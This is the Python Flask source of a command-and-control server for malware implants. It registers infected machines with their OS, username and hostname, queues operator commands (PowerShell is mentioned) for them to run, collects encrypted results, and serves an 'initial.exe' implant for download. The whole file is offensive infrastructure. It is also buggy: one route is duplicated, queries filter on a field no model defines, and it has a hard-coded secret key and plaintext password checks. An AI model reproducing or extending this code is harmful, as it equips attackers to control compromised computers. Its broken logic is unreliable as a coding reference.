import flask
from flask import Flask, Response, request, render_template, redirect, send_from_directory, url_for, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import flask_login
import base64
import os
from .enc_json import encrypt, decrypt
import json

app = Flask(__name__)
app.secret_key = '6AC6663F6BCFEB4191481AC41972DBEE4BDF6E7AA43E74F7E64C5F07DE69CE02'

##############
#  Database  #
##############
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Schema definitions
class Implant(db.Model):
	ProductID = db.Column(db.String, primary_key=True)
	OSName = db.Column(db.String, nullable=False)
	OSBuild = db.Column(db.String, nullable=False)
	Username = db.Column(db.String, nullable=False)
	ComputerName = db.Column(db.String, nullable=False)
	last_checkin = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
	creation_date = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)

class Operator(flask_login.UserMixin, db.Model):
	id = db.Column(db.Integer, primary_key=True)
	username = db.Column(db.String, nullable=False, unique=True)
	password = db.Column(db.String, nullable=False)

class Task(db.Model):
	id=db.Column(db.Integer, primary_key=True)
	job_id = db.Column(db.String)
	cmd = db.Column(db.String, nullable=False)
	#Command-Type i.e. is it a powershell cmd, etc.
	command_type = db.Column(db.String)
	Status = db.Column(db.String, nullable=False, default="Pending")
	implant_id = db.Column(db.String, nullable=False)

CREATED = "CREATED"
TASKED = "TASKED"
DONE = "DONE"

###################
#  Login Manager  #
###################
login_manager = flask_login.LoginManager()
login_manager.init_app(app)

@login_manager.unauthorized_handler
def unauthorized_handler():
	return render_template('unauth.html')

@login_manager.user_loader
def load_user(oid):
    return Operator.query.get(oid)

##############
#	Routes	 #
##############

# Login route
@app.route('/', methods=['GET', 'POST'])
def login():
	# GET request
	if flask.request.method == 'GET':
		return render_template('login.html')
	# POST request
	username = flask.request.form['username']
	password = flask.request.form['password']
	operator = Operator.query.filter_by(username=username, password=password).first()
	if operator != None:
		# Valid login
		flask_login.login_user(operator, remember=True)
		return redirect('/monitor')
	# Invalid login
	return render_template('unauth.html')

#@app.route('/createtask/<ProductID>', methods=['POST'])
@app.route("/tasks/create", methods=["POST"])
@flask_login.login_required
def createtask(ProductID):
	new_task = Task(cmd=flask.request.form['command'], implant_id=ProductID)
	db.session.add(new_task)
	db.session.commit()
	return redirect('/monitor')

def find_agent_by_id(id_):
    return Implant.query.filter_by(agent_id=id_).first()

def make_job_id():
    return os.urandom(16).hex()

@app.route("/tasks/create", methods=["POST"])
@flask_login.login_required
def create_task():
    data = request.json

    if data == None:
        return jsonify({"status": "bad task!"})
    # Add error checking 
    task_type = data.get("type")
    task_command = data.get("cmd")
    implant_id = data.get("implant_id")
    agent = find_agent_by_id(implant_id)
    if agent == None:
        return jsonify({"status": "no agent with that ID"})
    task = Task(
        job_id= make_job_id() ,
		cmd = task_command,
        command_type = task_type,  
        Status=CREATED,
        agent_id= implant_id
    )
    db.session.add(task)
    db.session.commit()

    print(f"[+] A new task has been created for {implant_id}")
    return jsonify({"status": "ok", "message": task.job_id})

# we get get/recieve job reqeusts/response
@app.route("/tasks", methods = [ "POST"])
def tasking():
    #add decrpyt for data
	data = request.json #<== Get JSON Request
	dict_data = json.load(data) #<== Convert JSON to Dict
	dec_data = decrypt(dict_data) #Decrypt data
	if dec_data == None:
		return jsonify({"status": "Bad", "message": "boo you!"})
	job_id = dec_data.get("job_id")
	agent_id = dec_data.get("agent_id")
	task_result = dec_data.get("task_response")
	if task_result:
		for response in task_result:
			t_job_id = response.get("job_id")
			t_job_resp = response.get("result")
			task = Task.query.filter_by(job_id = t_job_id).first()
			if task.Status != TASKED:
				print("[+] Possible replay attack!", task)
			else:
				print(f"[+] Agent responded to job {t_job_id} with result: {t_job_resp}" )
				task.Status = DONE
				db.session.commit()
            # we need to set the task to compiled 
	agent = find_agent_by_id(agent_id)
    # invalid agent 
	if agent == None:
		bad_agent = {"status": "Bad", "message": "Bad agent!"}
		payload = encrypt(bad_agent)
		return jsonify(payload)
	task = Task.query.filter_by(agent_id=agent_id, Status = CREATED).first()
	if task == None:
        # no work to be done
		return jsonify({})
	else:
        # have tasked the agent
		task.Status = TASKED
		db.session.commit()
		payload = encrypt(dec_data) #<== Encrypt the dict
		return jsonify(payload)

	



@app.route('/tasks/<ProductID>', methods=['GET'])
def get_tasks(ProductID):
	# Update last checkin time
	implant = Implant.query.get(ProductID)
	implant.last_checkin = datetime.utcnow()
	db.session.commit()
	# Send pending commands to implant
	tasks = Task.query.filter_by(implant_id=ProductID).first()
	return flask.Response(response=tasks.cmd, status=200)

@app.route('/monitor')
@flask_login.login_required
def monitor():
	implantlist = Implant.query.all()
	templatelist = []
	for implant in implantlist:
		pending = Task.query.filter_by(implant_id=implant.ProductID, status="Pending").count()
		templatelist.append((implant.ProductID, pending, implant.last_checkin, implant.creation_date))
	return render_template('monitor.html', implants=templatelist)

@app.route('/register', methods=['POST'])
def register():
	# TODO: Needs error checking
	# Get implant id (iid)
	pid = request.json['ProductID']
	osname = request.json['OSName']
	osbuild = request.json['OSBuild']
	username = request.json['Username']
	computer_name = request.json['ComputerName']
	# Save to database
	# Check if exists
	if (Implant.query.filter_by(ProductID=pid).first() is None):
		new_implant = Implant(ProductID=pid, OSName=osname, OSBuild=osbuild, Username=username, ComputerName=computer_name)
		db.session.add(new_implant)
		db.session.commit()
		return flask.Response(response='Registered', status=200)
	else:
		return flask.Response(response='Previously registered', status=200)
	

@app.route('/initial', methods=['GET'])
def download_implant():
	return send_from_directory(directory=app.root_path, filename='initial.exe')

if __name__ == "__main__":
	app.run(port=5000, debug=True)